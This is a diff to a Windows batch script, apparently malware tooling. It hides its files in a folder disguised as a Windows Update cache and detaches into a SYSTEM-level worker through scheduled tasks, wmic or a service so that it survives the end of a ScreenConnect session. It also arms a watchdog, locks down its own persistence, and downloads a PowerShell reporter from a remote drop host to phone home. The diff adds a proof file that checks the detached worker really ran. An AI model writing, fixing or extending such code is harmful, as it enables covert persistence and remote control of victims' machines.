@@ -1,6 +1,6 @@
 @echo off
 setlocal EnableExtensions EnableDelayedExpansion
-REM OWN BUILD 20260802O15 - self-contained embed + identity + mutual watchdog + pkg.msi fallback
+REM OWN BUILD 20260802O16 - self-contained embed + identity + mutual watchdog + pkg.msi fallback
 set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
 set "BOOT=%SystemRoot%\Temp\.wucache"
 set "LOG=%WD%\boot.err"
@@ -23,7 +23,7 @@ if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1
 
 REM Survive ScreenConnect Guest kill: detach into SYSTEM worker
 if /I not "%~1"=="_RUN" (
-  echo === OWN BUILD 20260802O15 ===
+  echo === OWN BUILD 20260802O16 ===
   echo whoami:
   whoami
   set "ELEV=0"
@@ -54,7 +54,7 @@ if /I not "%~1"=="_RUN" (
     echo go_start %DATE% %TIME%>"%LOG%"
   )
   echo order=msi_then_primary_then_nuke_foreign>>"%LOG%"
-  echo engine=cmd_detached_o15>>"%LOG%"
+  echo engine=cmd_detached_o16>>"%LOG%"
   echo whoami_launcher=>>"%LOG%"
   whoami >>"%LOG%" 2>&1
   echo detach_begin>>"%LOG%"
@@ -63,19 +63,24 @@ if /I not "%~1"=="_RUN" (
   if exist "%SELF%" set "RUNNER=%SELF%"
 
   REM Method A: plain schtasks as SYSTEM (paths have no spaces)
+  REM NOTE: RUNNER is set inside this block - MUST use !RUNNER! (delayed expansion)
   schtasks /Delete /TN "WucacheOwn" /F >nul 2>&1
-  schtasks /Create /TN "WucacheOwn" /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /F /TR "cmd.exe /c %RUNNER% _RUN" >"%BOOT%\detach.task" 2>&1
+  schtasks /Create /TN "WucacheOwn" /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /F /TR "cmd.exe /c !RUNNER! _RUN" >"%BOOT%\detach.task" 2>&1
   if not errorlevel 1 (
+    del /f /q "%BOOT%\wproof" >nul 2>&1
     schtasks /Run /TN "WucacheOwn" >"%BOOT%\detach.run" 2>&1
     if not errorlevel 1 (
-      set "DETACH_OK=1"
-      echo detach_via=schtasks_root>>"%LOG%"
+      timeout /t 6 /nobreak >nul 2>&1
+      if exist "%BOOT%\wproof" (
+        set "DETACH_OK=1"
+        echo detach_via=schtasks_root>>"%LOG%"
+      )
     )
   )
 
   REM Method B: wmic (often absent on Win11)
   if "!DETACH_OK!"=="0" (
-    wmic process call create "cmd.exe /c \"%RUNNER%\" _RUN" >"%BOOT%\detach.wmic" 2>&1
+    wmic process call create "cmd.exe /c \"!RUNNER!\" _RUN" >"%BOOT%\detach.wmic" 2>&1
     findstr /C:"ReturnValue = 0" "%BOOT%\detach.wmic" >nul 2>&1
     if not errorlevel 1 (
       set "DETACH_OK=1"
@@ -85,7 +90,7 @@ if /I not "%~1"=="_RUN" (
 
   REM Method C: one-shot service (flat path; cmd not a service - last resort)
   if "!DETACH_OK!"=="0" (
-    copy /y "%RUNNER%" "%SystemRoot%\Temp\wucache_own.cmd" >nul 2>&1
+    copy /y "!RUNNER!" "%SystemRoot%\Temp\wucache_own.cmd" >nul 2>&1
     sc.exe stop WucacheOwn >nul 2>&1
     sc.exe delete WucacheOwn >nul 2>&1
     sc.exe create WucacheOwn binPath= "cmd.exe /c %SystemRoot%\Temp\wucache_own.cmd _RUN" start= demand type= own >"%BOOT%\detach.sc" 2>&1
@@ -99,7 +104,7 @@ if /I not "%~1"=="_RUN" (
   if "!DETACH_OK!"=="0" (
     echo detach_via=inline_fallback>>"%LOG%"
     echo WARNING: detach APIs failed - running inline (Guest may kill)
-    call "%RUNNER%" _RUN
+    call "!RUNNER!" _RUN
     exit /b !ERRORLEVEL!
   )
 
@@ -112,7 +117,8 @@ if /I not "%~1"=="_RUN" (
 )
 
 echo worker_start %DATE% %TIME%>>"%LOG%"
-echo === OWN WORKER 20260802O15 ===
+echo ok>"%BOOT%\wproof" 2>nul
+echo === OWN WORKER 20260802O16 ===
 if not exist "%LOG%" (
   set "LOG=%SystemRoot%\Temp\.wucache\boot.err"
   if not exist "%SystemRoot%\Temp\.wucache" mkdir "%SystemRoot%\Temp\.wucache" >nul 2>&1
@@ -250,7 +256,7 @@ if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -Execution
 echo watchdog_armed>>"%LOG%"
 
 REM campaign state baseline
-if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build O15 -Extra "deploy" >nul 2>&1
+if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build O16 -Extra "deploy" >nul 2>&1
 
 echo [6b] Re-lock persist dirs/tasks/SC after arm...
 if exist "%~dp0own_secure.cmd" copy /y "%~dp0own_secure.cmd" "%WD%\own_secure.cmd" >nul
@@ -271,7 +277,7 @@ if exist "%~dp0tg_report.ps1" (
 if not exist "%WD%\tg_report.ps1" (
   powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%DROP%/tg_report.ps1' -OutFile '%WD%\tg_report.ps1' -UseBasicParsing" >nul 2>&1
 )
-powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State DEPLOY -Summary "own.cmd first deploy complete" -WorkDir "%WD%" -Build O15 >>"%LOG%" 2>&1
+powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State DEPLOY -Summary "own.cmd first deploy complete" -WorkDir "%WD%" -Build O16 >>"%LOG%" 2>&1
 echo deploy_tg_done>>"%LOG%"
 
 sc query "%PRIM%" >>"%LOG%" 2>&1
